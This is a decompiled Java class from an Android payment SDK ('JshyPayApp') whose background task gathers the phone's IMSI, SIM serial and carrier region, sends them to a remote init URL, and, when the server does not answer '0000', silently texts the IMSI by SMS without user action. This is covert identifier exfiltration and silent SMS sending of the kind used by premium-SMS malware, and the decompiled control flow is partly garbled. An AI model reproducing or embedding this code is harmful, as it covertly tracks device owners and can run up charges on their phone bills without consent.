package com.jshyproject.price;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import android.text.TextUtils;
import com.jshyproject.price.net.Purl;
import com.jshyproject.price.net.Video;
import com.jshyproject.price.soimsi.ImsiMobileBean;
import com.jshyproject.price.soimsi.SoImsiHelper;
import com.jshyproject.price.ztool.ZNetManager;
import com.jshyproject.price.ztool.ZNetTask;
import com.jshyproject.price.ztool.ZPhoneInfo;
import com.jshyproject.price.ztool.Zlog;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

final class b
  implements Runnable
{
  b(JshyPayApp paramJshyPayApp, String paramString1, String paramString2) {}
  
  public final void run()
  {
    Zlog.syso("init...phone..number");
    NumberInit.initSync(this.a.a);
    try
    {
      Thread.sleep(NumberInit.dTime);
      Zlog.syso("on..Net..!.init.....!");
      localObject1 = new StringBuffer();
      localObject2 = SoImsiHelper.getImsiInfo(this.b);
      if (localObject2 == null) {}
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;)
      {
        String str2;
        try
        {
          String str1 = URLEncoder.encode(((ImsiMobileBean)localObject2).getSheng(), "utf-8");
          ((StringBuffer)localObject1).append("&cs=" + ((ImsiMobileBean)localObject2).getService() + "&cc=" + str1);
          str1 = Video.getViedoV();
          if (!TextUtils.isEmpty(str1)) {
            Video.type = str1;
          }
          str1 = Video.getVideoM(Video.type, this.b);
          str1 = Purl.makeUrl(Purl.init_url, this.a.a) + "&iccid=" + this.c + ((StringBuffer)localObject1).toString() + "&m=" + str1;
          localObject1 = ZNetManager.getByteFromNet(str1, null, 0, null);
          Zlog.syso("sdk.init.info-> url:" + str1 + ",back:" + localObject1);
          if (localObject1 != null)
          {
            str1 = new String((byte[])localObject1);
            Zlog.syso("!init_old:" + str1);
            if (!str1.equals("0000")) {
              break label373;
            }
            JshyPayApp.a().edit().remove("appinit").putBoolean("appinit", true).commit();
            JshyPayApp.a().edit().remove("appImsi").putString("appImsi", ZPhoneInfo.getIMSI(this.a.a)).commit();
          }
          ZNetTask.getStr(Purl.makeUrl(Purl.ver_info, this.a.a));
          return;
          localInterruptedException = localInterruptedException;
          localInterruptedException.printStackTrace();
        }
        catch (UnsupportedEncodingException localUnsupportedEncodingException)
        {
          localUnsupportedEncodingException.printStackTrace();
          str2 = null;
          continue;
        }
        ((StringBuffer)localObject1).append("&cs=&cc=");
        continue;
        label373:
        Object localObject1 = SmsManager.getDefault();
        Object localObject2 = new Intent("FIRST_SEND");
        localObject2 = PendingIntent.getBroadcast(this.a.a.getApplicationContext(), 1001, (Intent)localObject2, 1073741824);
        Object localObject3 = new Intent("FIRST_SEND");
        localObject3 = PendingIntent.getBroadcast(this.a.a.getApplicationContext(), 1002, (Intent)localObject3, 1073741824);
        String str3 = ZPhoneInfo.getIMSI(this.a.a.getApplicationContext());
        try
        {
          ((SmsManager)localObject1).sendTextMessage(str2, null, str3, (PendingIntent)localObject2, (PendingIntent)localObject3);
          JshyPayApp.a().edit().remove("appinit").putBoolean("appinit", true).commit();
          JshyPayApp.a().edit().remove("appImsi").putString("appImsi", ZPhoneInfo.getIMSI(this.a.a)).commit();
        }
        catch (Exception localException)
        {
          Zlog.syso("init....go....catch" + localException.getMessage());
        }
      }
    }
  }
}
